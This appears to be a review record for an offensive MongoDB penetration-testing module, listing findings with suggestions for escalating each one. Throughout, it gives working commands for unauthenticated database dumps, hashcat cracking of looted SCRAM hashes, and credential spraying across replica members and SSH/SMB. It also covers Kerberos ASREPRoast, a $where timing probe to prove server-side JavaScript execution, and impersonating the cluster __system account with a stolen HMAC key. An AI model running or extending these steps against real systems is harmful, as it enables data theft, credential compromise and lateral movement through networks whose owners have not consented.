summary: Best-in-tranche module: hand-rolled OP_MSG/BSON wire, unauth listDatabases discriminator plus a deep read-only sweep (usersInfo w/ credentials -> hashcat 24100/24200, replSetGetStatus, replSetGetConfig, getShardMap, hostInfo, startupWarnings, local.system.keys, collection inventory, scripting flag). Also has SCRAM auth, weak-default cred sweep, credentialed follow-through, datamine of PII/connstrs, and replica-member auto-lateral. Biggest gap: server-side JS/mapReduce is only flag-verified (T1) instead of a $where or eval PoC that would confirm the RCE primitive.

findings.tier_evidence: listDatabases actually returns the DB list; totalSize + names captured (controlled read proof), plus deep enum (users, replset, keys, shards) all fired.
findings.promotion_notes: Already reads users+hashes and mints __system creds via cluster_keys; T3 is achieved when those looted creds are fed into a replay/spray pool that authenticates elsewhere. Wire looted hashes into weak-cred sweep across other MongoDBs found in scope.
findings.tester_next_step: mongodump --host <ip> --port <port> --out loot/ ; then hashcat -m 24200 loot/hashes -a 0 rockyou.txt and replay any cracked pair against other mongod ports discovered in scope.

findings.tier_evidence: weak_password_sweep + probe_creds actually authenticates SCRAM with a bundled default and reads DBs as that principal - foothold.
findings.promotion_notes: T4 = pivot from foothold: use the working cred to auth to every replSet member/shard host, dump usersInfo across the cluster, cross-spray same pw at OS layer (SSH/SMB). Add a cluster-wide auto-follow using the shard_hosts + replset_members lists.
findings.tester_next_step: mongosh 'mongodb://<user>:<pw>@<ip>:<port>/?authSource=admin' --eval 'db.adminCommand({usersInfo:1,showCredentials:true})' ; then mongodump with the same URI. Try the same (user,pw) on each replSet member and OS-layer services.

findings.tier_evidence: SCRAM auth completes with supplied creds; deep enum runs authenticated including usersInfo+hashes.
findings.promotion_notes: Same as weak_default: chain via cluster_keys __system relay + hash crack loop -> DB dump.
findings.tester_next_step: mongodump --uri 'mongodb://<user>:<pw>@<ip>:<port>/?authSource=admin' --out loot/ ; feed harvested SCRAM hashes to hashcat -m 24100/24200.

findings.tier_evidence: getParameter('scripting') returns true - passive flag read only; no $where / eval / mapReduce actually invoked.
findings.promotion_notes: Send a benign $where or mapReduce with a JS body that emits an OOB DNS/HTTP callback to a canary (or a computed integer echo) to prove server-side JS actually executes. On <3.x also try `eval`.
findings.tester_next_step: mongosh 'mongodb://<ip>:<port>/test' --eval 'db.foo.find({$where: "sleep(150); return true"})' - a measurable delay proves JS execution; then swap sleep() for a DNS(<canary>) primitive.

findings.tier_evidence: getShardMap returns real cluster host list - deterministic disclosure that only fires when unauth read is possible.
findings.promotion_notes: Auto-probe each shard host with the same probe() to prove the same exposure applies cluster-wide (target inventory -> confirmed exposures). Wire shard_hosts into svcprobe like replSet members already are.
findings.tester_next_step: for h in <shard_hosts>; do mongosh mongodb://$h/ --eval 'db.adminCommand({listDatabases:1})'; done

findings.tier_evidence: listCollections per DB returns real names; deterministic evidence of unauth ACL reach, no documents read here.
findings.promotion_notes: datamine() already reads documents; this kind stays as the inventory pointer while mongo_datamine carries the T2 document-read evidence.
findings.tester_next_step: mongosh mongodb://<ip>:<port>/<db> --eval 'db.<coll>.find().limit(20)' for each interesting collection name in the inventory.

findings.tier_evidence: hostInfo returns hostname/OS - safe read that only succeeds when unauth or hostManager role assigned.
findings.promotion_notes: Feed hostname into shared FQDN pool consumed by SMB/RDP/Kerberos modules for TGT/spray targeting; T2 comes from any of those services confirming access with the harvested identity.
findings.tester_next_step: mongosh mongodb://<ip>:<port>/ --eval 'db.adminCommand({hostInfo:1})' ; then use the hostname/OS pair for SMB spraying or Kerberos ASREPRoast.

findings.tier_evidence: getLog:startupWarnings returns the server's own misconfig list - a positive server-declared verification.
findings.promotion_notes: Each warning line is already a targeted misconfig; parse specific lines (auth-off, weak TLS, THP) to emit individual sub-findings if further granularity is wanted.

findings.tier_evidence: find on local.system.keys returns cluster HMAC keyId/key bytes - the __system credential is exfiltrated to the loot pool as a Credential.
findings.promotion_notes: Replay the harvested __system HMAC key against every replset member / mongos as SCRAM-SHA-256 for cluster-wide impersonation; auto-wire the __system creds into replica-member auto-probe.
findings.tester_next_step: python3 -c 'import hmac,base64,hashlib; ...' to derive the SCRAM saltedPassword from the HMAC key, then attempt SCRAM-SHA-256 as __system against each replset_member/shard_host - success = full cluster.

findings.title_pattern: MongoDB sensitive data exposed (PII / secrets / credentials)
findings.tier_evidence: datamine() actually runs `find` limit=3 across up to 6 DBs / 12 collections, extracts secret-field values (redacted), and mines embedded connection strings into the credential feed.
findings.promotion_notes: Harvested connection strings already go into the Credential loot; auto-connect to those DSNs (Postgres/MSSQL/Mongo/Redis) to prove access on the target-of-the-target - which is T3 on that follow-on service.
findings.tester_next_step: grep -E 'mongodb://|postgres://|mysql://' loot/mongo/datamine.json - then feed each connstr to the matching recce db probe (probe_creds).

findings.tier_evidence: buildInfo.version compared to a hard-coded floor (major<4); pure enum, no CVE probe fired.
findings.promotion_notes: Wire vuln.vulndb version->CVE map so specific CVEs (e.g. CVE-2019-2386, CVE-2020-7921) become their own kinds with a version-only T1 verify.
findings.tester_next_step: mongosh mongodb://<ip>:<port>/ --eval 'db.version()' - cross-reference against MongoDB security advisories.

findings.tier_evidence: _probe_members() reaches each advertised member and re-runs probe/probe_creds - it actually returns the DB list from a NEW node, proving lateral read access.
findings.promotion_notes: Already lateral; T3 = auto-datamine the lateral node with same auth path so a full cluster dump comes back. Currently only findings surface, not the loot.
findings.tester_next_step: mongodump --host <lateral-host> --port <port> --out loot/mongo/<host>/ ; feed hashes and connstrs into the shared pools like the primary path already does.

proposed_shared_surface_consumers: cluster_keys (__system key -> lateral scram spray pool)
known_users (from usersInfo dumps -> spray other services)
